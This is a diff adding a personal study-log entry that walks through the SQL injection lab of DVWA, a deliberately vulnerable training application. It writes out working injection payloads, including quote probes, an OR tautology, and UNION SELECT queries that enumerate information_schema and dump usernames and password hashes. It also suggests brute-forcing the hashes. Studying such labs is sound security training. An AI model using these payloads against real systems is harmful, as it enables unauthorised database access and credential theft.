@@ -1,0 +1,134 @@
+# Monday, April 11, 2022
+
+This week, the plan is to gather as much information about SQL injection as possible.
+
+## DVWA Easy
+
+### Introduction
+
+The SQL Injection challenge of DVWA displays an entry text box and a submit button.
+The interface requests the user to input some "User ID:" in the textbox, click submit and returns information about the selected user:
+
+
+Eaxamples:
+
+```
+User ID: 1
+ID: 1
+First name: admin
+Surname: admin
+```
+
+```
+User ID: 2
+ID: 2
+First name: Gordon
+Surname: Brown
+```
+
+```
+User ID: 3
+ID: 3
+First name: Hack
+Surname: Me
+```
+
+### Breaking the statement
+
+When attempting to inject various characters, you can find which engine is most likely handling the quesry.
+
+Attempt 1: the double-quote (")
+
+```
+User ID: 3"
+ID: 3"
+First name: Hack
+Surname: Me
+```
+The double quote did not break the statement.
+
+Attempt 2: the hash sign (#), double tack (--) and slashes
+
+```
+User ID: 3 # -- #
+ID: 3 # -- #
+First name: Hack
+Surname: Me
+```
+
+Attempt 3: the single quote (')
+
+```
+User ID: 3
+```
+
+This input broke the SQL query, the page returned contains the following:
+
+> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near line '3''' at line 1
+
+### Fixing the statement
+
+Knowing that that SQL statement is broken by the injection of a single quote, the next goal is to fix the input to return something valuable.
+
+We can assume the SQL statement in the backend looks like:
+
+  SELECT first_name,last_name FROM users WHERE user_id = '<user_input>'
+  
+To prove That we can exploit the injection, let's complete the query and retreive 2 users.
+
+Payload:
+
+  1' or user_id = '2
+  
+This returs two entries, admin admin and Gordon Brown, but not Hack Me...
+
+### Exploiting the injection
+
+Information to gathering:
+
+Getting the database name, knowing we have 2 fields to provide null and foobar:
+
+  ' union select null,foobar() -- 
+
+This payload returns the following output:
+
+> FUNCTION dvwa.foobar does not exist
+
+The output leaks the database name, that's useful.
+ 
+ ### Working to inject another command:
+ 
+ Knowing that the database name is "dvwa", we can use this to list the user defined tables:
+
+```
+' union select null, table_name from information_schema.tables where table_schema = "dvwa" --
+```
+
+> guestbook
+> users
+
+Great, there's two table, lets dig into users
+
+```
+' union select null, column_name from information_schema.columns where table_name = "users" #
+```
+
+> user_id
+> first_name
+> last_name
+> user
+> password
+> avatar
+> last_login
+> failed_login
+
+Now that we have the tables, let's dump password hashes and usernames
+
+```
+' union select users.user,users.password from users -- 
+```
+
+Comparing the hashes, we notice that admin and smithy are using the same password, "password". Other hashes can be bruteforced.
+  
+  
+  
